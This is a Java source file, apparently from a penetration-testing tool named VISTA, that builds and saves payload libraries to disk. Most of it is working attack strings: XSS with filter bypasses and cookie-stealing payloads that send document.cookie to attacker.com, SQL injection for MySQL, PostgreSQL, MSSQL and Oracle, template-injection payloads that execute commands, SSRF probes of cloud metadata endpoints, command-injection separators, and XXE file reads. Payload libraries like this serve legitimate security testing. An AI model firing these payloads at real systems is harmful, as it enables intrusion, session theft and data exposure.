package com.vista.security.core;

import com.vista.security.model.Payload;
import com.vista.security.model.PayloadLibrary;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;

/**
 * Creates and installs built-in payload libraries.
 * This class generates comprehensive payload collections for common vulnerabilities.
 */
public class BuiltInPayloads {
    
    private static final String HOME_DIR = System.getProperty("user.home");
    private static final String BUILT_IN_DIR = HOME_DIR + File.separator + ".vista" + 
                                               File.separator + "payloads" + File.separator + "built-in";
    
    /**
     * Install all built-in payload libraries.
     */
    public static void installBuiltInLibraries() {
        try {
            Files.createDirectories(Paths.get(BUILT_IN_DIR));
            
            // Create and save each library
            saveLibrary(createXSSReflectedLibrary());
            saveLibrary(createXSSStoredLibrary());
            saveLibrary(createSQLiErrorBasedLibrary());
            saveLibrary(createSQLiBlindLibrary());
            saveLibrary(createSSTILibrary());
            saveLibrary(createSSRFLibrary());
            saveLibrary(createCommandInjectionLibrary());
            saveLibrary(createXXELibrary());
            
            System.out.println("Built-in payload libraries installed successfully");
        } catch (Exception e) {
            System.err.println("Failed to install built-in libraries: " + e.getMessage());
        }
    }
    
    /**
     * Save a library to disk.
     */
    private static void saveLibrary(PayloadLibrary library) {
        try {
            String filename = sanitizeFilename(library.getName()) + ".json";
            String filepath = BUILT_IN_DIR + File.separator + filename;
            Files.write(Paths.get(filepath), library.toJson().getBytes());
        } catch (Exception e) {
            System.err.println("Failed to save library: " + library.getName());
        }
    }
    
    /**
     * Sanitize filename.
     */
    private static String sanitizeFilename(String name) {
        return name.replaceAll("[^a-zA-Z0-9-_]", "_").toLowerCase();
    }
    
    // ========== XSS - Reflected ==========
    
    private static PayloadLibrary createXSSReflectedLibrary() {
        PayloadLibrary library = new PayloadLibrary("XSS - Reflected", "XSS", "Reflected");
        library.setBuiltIn(true);
        library.setSource("VISTA Built-in");
        library.setDescription("Reflected XSS payloads for various contexts and WAF bypasses");
        
        // Basic XSS
        addPayload(library, "<script>alert(1)</script>", "Basic script tag", "html-body", "none", "basic", "xss");
        addPayload(library, "<img src=x onerror=alert(1)>", "Image onerror event", "html-body", "none", "basic", "xss", "img");
        addPayload(library, "<svg onload=alert(1)>", "SVG onload event", "html-body", "none", "basic", "xss", "svg");
        addPayload(library, "<iframe src=javascript:alert(1)>", "Iframe javascript protocol", "html-body", "none", "basic", "xss", "iframe");
        addPayload(library, "<body onload=alert(1)>", "Body onload event", "html-body", "none", "basic", "xss");
        
        // Attribute context
        addPayload(library, "\" onmouseover=alert(1) x=\"", "Break out of attribute", "html-attribute", "none", "attribute", "xss");
        addPayload(library, "' onmouseover=alert(1) x='", "Single quote attribute break", "html-attribute", "none", "attribute", "xss");
        addPayload(library, "javascript:alert(1)", "JavaScript protocol in href", "html-attribute", "none", "attribute", "xss");
        addPayload(library, "\" autofocus onfocus=alert(1) x=\"", "Autofocus onfocus", "html-attribute", "none", "attribute", "xss");
        
        // JavaScript context
        addPayload(library, "'-alert(1)-'", "Break out of string", "javascript", "none", "js-context", "xss");
        addPayload(library, "\"-alert(1)-\"", "Double quote string break", "javascript", "none", "js-context", "xss");
        addPayload(library, "</script><script>alert(1)</script>", "Close script tag", "javascript", "none", "js-context", "xss");
        
        // WAF bypasses
        addPayload(library, "<ScRiPt>alert(1)</sCrIpT>", "Case variation", "html-body", "none", "waf-bypass", "xss");
        addPayload(library, "<script>alert(String.fromCharCode(88,83,83))</script>", "Character encoding", "html-body", "none", "waf-bypass", "xss");
        addPayload(library, "<img src=x onerror=\"alert(1)\">", "Quoted event handler", "html-body", "none", "waf-bypass", "xss");
        addPayload(library, "<svg><script>alert(1)</script></svg>", "SVG with script", "html-body", "none", "waf-bypass", "xss", "svg");
        addPayload(library, "<img src=x onerror=alert`1`>", "Template literals", "html-body", "none", "waf-bypass", "xss");
        addPayload(library, "<img/src=x/onerror=alert(1)>", "Slash instead of space", "html-body", "none", "waf-bypass", "xss");
        addPayload(library, "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", "Base64 encoded", "html-body", "none", "waf-bypass", "xss");
        
        // Polyglot
        addPayload(library, "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'", 
                   "XSS polyglot", "any", "none", "polyglot", "xss");
        
        return library;
    }
    
    // ========== XSS - Stored ==========
    
    private static PayloadLibrary createXSSStoredLibrary() {
        PayloadLibrary library = new PayloadLibrary("XSS - Stored", "XSS", "Stored");
        library.setBuiltIn(true);
        library.setSource("VISTA Built-in");
        library.setDescription("Stored XSS payloads optimized for persistence");
        
        addPayload(library, "<script>alert(document.domain)</script>", "Domain alert", "html-body", "none", "basic", "xss");
        addPayload(library, "<img src=x onerror=alert(document.cookie)>", "Cookie stealer", "html-body", "none", "basic", "xss", "cookie");
        addPayload(library, "<svg onload=fetch('https://attacker.com?c='+document.cookie)>", "Cookie exfiltration", "html-body", "none", "exfiltration", "xss");
        addPayload(library, "<script>new Image().src='https://attacker.com?c='+document.cookie</script>", "Image-based exfiltration", "html-body", "none", "exfiltration", "xss");
        addPayload(library, "<iframe src=javascript:alert(origin)>", "Origin disclosure", "html-body", "none", "basic", "xss");
        
        return library;
    }
    
    // ========== SQL Injection - Error Based ==========
    
    private static PayloadLibrary createSQLiErrorBasedLibrary() {
        PayloadLibrary library = new PayloadLibrary("SQLi - Error Based", "SQLi", "Error Based");
        library.setBuiltIn(true);
        library.setSource("VISTA Built-in");
        library.setDescription("Error-based SQL injection payloads for various databases");
        
        // MySQL
        addPayload(library, "' OR 1=1--", "Basic OR bypass", "any", "none", "mysql", "sqli", "basic");
        addPayload(library, "' AND 1=2 UNION SELECT NULL--", "Union NULL", "any", "none", "mysql", "sqli", "union");
        addPayload(library, "' AND extractvalue(1,concat(0x7e,version()))--", "ExtractValue version", "any", "none", "mysql", "sqli", "error");
        addPayload(library, "' AND updatexml(1,concat(0x7e,database()),1)--", "UpdateXML database", "any", "none", "mysql", "sqli", "error");
        addPayload(library, "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--", 
                   "Double query injection", "any", "none", "mysql", "sqli", "error");
        
        // PostgreSQL
        addPayload(library, "' OR 1=1--", "Basic OR bypass", "any", "none", "postgresql", "sqli", "basic");
        addPayload(library, "' AND 1=CAST((SELECT version()) AS int)--", "Cast to int error", "any", "none", "postgresql", "sqli", "error");
        addPayload(library, "' AND 1=CAST((SELECT current_database()) AS int)--", "Database name error", "any", "none", "postgresql", "sqli", "error");
        
        // MSSQL
        addPayload(library, "' OR 1=1--", "Basic OR bypass", "any", "none", "mssql", "sqli", "basic");
        addPayload(library, "' AND 1=CONVERT(int,@@version)--", "Convert version", "any", "none", "mssql", "sqli", "error");
        addPayload(library, "' AND 1=CONVERT(int,db_name())--", "Database name", "any", "none", "mssql", "sqli", "error");
        
        // Oracle
        addPayload(library, "' OR 1=1--", "Basic OR bypass", "any", "none", "oracle", "sqli", "basic");
        addPayload(library, "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--", 
                   "CTX error", "any", "none", "oracle", "sqli", "error");
        
        return library;
    }
    
    // ========== SQL Injection - Blind ==========
    
    private static PayloadLibrary createSQLiBlindLibrary() {
        PayloadLibrary library = new PayloadLibrary("SQLi - Blind", "SQLi", "Blind");
        library.setBuiltIn(true);
        library.setSource("VISTA Built-in");
        library.setDescription("Blind SQL injection payloads (boolean and time-based)");
        
        // Boolean-based
        addPayload(library, "' AND 1=1--", "True condition", "any", "none", "boolean", "sqli", "blind");
        addPayload(library, "' AND 1=2--", "False condition", "any", "none", "boolean", "sqli", "blind");
        addPayload(library, "' AND SUBSTRING(version(),1,1)='5'--", "Version check", "any", "none", "boolean", "sqli", "blind");
        addPayload(library, "' AND ASCII(SUBSTRING(database(),1,1))>97--", "ASCII comparison", "any", "none", "boolean", "sqli", "blind");
        
        // Time-based (MySQL)
        addPayload(library, "' AND SLEEP(5)--", "Sleep 5 seconds", "any", "none", "time-based", "sqli", "blind", "mysql");
        addPayload(library, "' AND IF(1=1,SLEEP(5),0)--", "Conditional sleep", "any", "none", "time-based", "sqli", "blind", "mysql");
        addPayload(library, "' AND BENCHMARK(5000000,MD5('test'))--", "Benchmark delay", "any", "none", "time-based", "sqli", "blind", "mysql");
        
        // Time-based (PostgreSQL)
        addPayload(library, "' AND pg_sleep(5)--", "PG sleep", "any", "none", "time-based", "sqli", "blind", "postgresql");
        
        // Time-based (MSSQL)
        addPayload(library, "'; WAITFOR DELAY '00:00:05'--", "WAITFOR delay", "any", "none", "time-based", "sqli", "blind", "mssql");
        
        return library;
    }
    
    // ========== SSTI ==========
    
    private static PayloadLibrary createSSTILibrary() {
        PayloadLibrary library = new PayloadLibrary("SSTI - Template Injection", "SSTI", "All");
        library.setBuiltIn(true);
        library.setSource("VISTA Built-in");
        library.setDescription("Server-Side Template Injection payloads for various engines");
        
        // Jinja2 (Python)
        addPayload(library, "{{7*7}}", "Basic math test", "any", "none", "jinja2", "ssti", "detection");
        addPayload(library, "{{config}}", "Config disclosure", "any", "none", "jinja2", "ssti");
        addPayload(library, "{{''.__class__.__mro__[1].__subclasses__()}}", "Subclasses enumeration", "any", "none", "jinja2", "ssti");
        addPayload(library, "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", 
                   "RCE via os.popen", "any", "none", "jinja2", "ssti", "rce");
        
        // Twig (PHP)
        addPayload(library, "{{7*7}}", "Basic math test", "any", "none", "twig", "ssti", "detection");
        addPayload(library, "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", 
                   "RCE via filter", "any", "none", "twig", "ssti", "rce");
        
        // Freemarker (Java)
        addPayload(library, "${7*7}", "Basic math test", "any", "none", "freemarker", "ssti", "detection");
        addPayload(library, "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", 
                   "RCE via Execute", "any", "none", "freemarker", "ssti", "rce");
        
        // Velocity (Java)
        addPayload(library, "#set($x=7*7)$x", "Basic math test", "any", "none", "velocity", "ssti", "detection");
        addPayload(library, "#set($rt=Class.forName('java.lang.Runtime'))#set($chr=$rt.class.getMethod('getRuntime'))#set($process=$chr.invoke(null).exec('id'))$process", 
                   "RCE via Runtime", "any", "none", "velocity", "ssti", "rce");
        
        return library;
    }
    
    // ========== SSRF ==========
    
    private static PayloadLibrary createSSRFLibrary() {
        PayloadLibrary library = new PayloadLibrary("SSRF - Server Side Request Forgery", "SSRF", "All");
        library.setBuiltIn(true);
        library.setSource("VISTA Built-in");
        library.setDescription("SSRF payloads for internal network access");
        
        addPayload(library, "http://localhost", "Localhost access", "any", "none", "basic", "ssrf");
        addPayload(library, "http://127.0.0.1", "Loopback IP", "any", "none", "basic", "ssrf");
        addPayload(library, "http://[::1]", "IPv6 localhost", "any", "none", "basic", "ssrf");
        addPayload(library, "http://169.254.169.254/latest/meta-data/", "AWS metadata", "any", "none", "cloud", "ssrf", "aws");
        addPayload(library, "http://metadata.google.internal/computeMetadata/v1/", "GCP metadata", "any", "none", "cloud", "ssrf", "gcp");
        addPayload(library, "http://192.168.0.1", "Private network", "any", "none", "internal", "ssrf");
        addPayload(library, "http://10.0.0.1", "Private network 10.x", "any", "none", "internal", "ssrf");
        addPayload(library, "file:///etc/passwd", "File protocol", "any", "none", "file", "ssrf");
        addPayload(library, "gopher://127.0.0.1:6379/_", "Gopher protocol", "any", "none", "protocol", "ssrf");
        
        return library;
    }
    
    // ========== Command Injection ==========
    
    private static PayloadLibrary createCommandInjectionLibrary() {
        PayloadLibrary library = new PayloadLibrary("Command Injection", "Command Injection", "All");
        library.setBuiltIn(true);
        library.setSource("VISTA Built-in");
        library.setDescription("OS command injection payloads");
        
        // Basic
        addPayload(library, "; id", "Semicolon separator", "any", "none", "basic", "command-injection");
        addPayload(library, "| id", "Pipe separator", "any", "none", "basic", "command-injection");
        addPayload(library, "& id", "Ampersand separator", "any", "none", "basic", "command-injection");
        addPayload(library, "&& id", "Double ampersand", "any", "none", "basic", "command-injection");
        addPayload(library, "|| id", "Double pipe", "any", "none", "basic", "command-injection");
        addPayload(library, "`id`", "Backtick execution", "any", "none", "basic", "command-injection");
        addPayload(library, "$(id)", "Dollar parenthesis", "any", "none", "basic", "command-injection");
        
        // Bypass
        addPayload(library, ";i\\d", "Backslash escape", "any", "none", "bypass", "command-injection");
        addPayload(library, ";i'd'", "Quote bypass", "any", "none", "bypass", "command-injection");
        addPayload(library, ";i\"d\"", "Double quote bypass", "any", "none", "bypass", "command-injection");
        addPayload(library, ";$IFS$9id", "IFS bypass", "any", "none", "bypass", "command-injection");
        
        return library;
    }
    
    // ========== XXE ==========
    
    private static PayloadLibrary createXXELibrary() {
        PayloadLibrary library = new PayloadLibrary("XXE - XML External Entity", "XXE", "All");
        library.setBuiltIn(true);
        library.setSource("VISTA Built-in");
        library.setDescription("XXE payloads for XML parsers");
        
        addPayload(library, "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", 
                   "Basic file read", "any", "none", "basic", "xxe");
        addPayload(library, "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com\">]><foo>&xxe;</foo>", 
                   "External HTTP request", "any", "none", "basic", "xxe", "ssrf");
        addPayload(library, "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo>test</foo>", 
                   "Parameter entity", "any", "none", "advanced", "xxe");
        
        return library;
    }
    
    // ========== Helper Method ==========
    
    /**
     * Helper to add a payload to a library.
     */
    private static void addPayload(PayloadLibrary library, String value, String description, 
                                   String context, String encoding, String... tags) {
        Payload payload = new Payload(value, description);
        payload.setContext(context);
        payload.setEncoding(encoding);
        
        for (String tag : tags) {
            payload.addTag(tag);
        }
        
        library.addPayload(payload);
    }
}
